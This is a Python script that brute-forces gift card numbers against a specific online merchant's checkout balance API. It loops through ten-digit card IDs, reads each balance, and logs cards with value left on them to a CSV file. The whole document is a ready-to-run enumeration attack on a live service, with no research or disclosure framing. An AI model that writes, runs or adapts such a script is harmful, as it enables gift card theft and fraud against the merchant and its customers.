import requests
import json
import time

# Start a session to manage cookies
session = requests.session()

# Get ourselves a valid ASP.NET_SessionId value
burp0_url = "https://checkout.advanced-online.com:443/CheckoutV10/home/retailInput?ccode=HII&tcode=hii1&orderID=7228609&ship=20220510&splitShip=20220510"
burp0_cookies = {}
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"101\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "Origin": "https://hiigear.merchorders.com", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://hiigear.merchorders.com/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
burp0_data = {}
resp = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

# Set up request variables needed to interrogate balances
burp0_url = "https://checkout.advanced-online.com:443/CheckoutV10/home/GiftBlance"
burp0_cookies = {}
burp0_headers = {"Sec-Ch-Ua": "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"101\"", "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/json; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Origin": "https://checkout.advanced-online.com", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://checkout.advanced-online.com/CheckoutV10/home/Checkout1", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}

# Open file to write non-zero balances to
f = open("balances.csv","w")
f.write("gcardid,balance\n")

# We probably should keep track to make sure we aren't just getting a lot of bad responses
badRespCount = 0

# Loop over range of valid card numbers
for i in range(0,10000000000):
	# Set cardId to i, zero-fill left up to 10 places
	burp0_data = "{'cardId':'%s'}" % str(i).zfill(10)

	# POST request
	resp = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

	# If we get too many bad responses in a row we should just quit
	if (resp.status_code != 200):
		# If not 200 then increment the bad response count
		badRespCount = badRespCount + 1

		# If we get more than 10 in a row we should stop
		if (badRespCount > 10):
			print("Too many bad responses in a row!")
			break

	# Reset bad response count if we get a good one
	badRespCount = 0

	# A valid card number has a non-zero content length
	if (len(resp.content) != 0):
		content = json.loads(resp.content)

		# If nothing has been used then 'gamt_used' will be and empty string,
		# let's make it '0.0' instead
		if content['gamt_used'] == '':
			content['gamt_used'] = '0.0'

		# Calculate card balance
		balance = float(content['gcardAmt']) - float(content['gamt_used'])

		# If non-zero balance then write out the card number and balance to the file
		if (balance != 0):
			f.write("%s,%s\n" % (content['gcardid'],balance))

	# Try not to hammer the server
	time.sleep(0.01)

# Close file
f.close()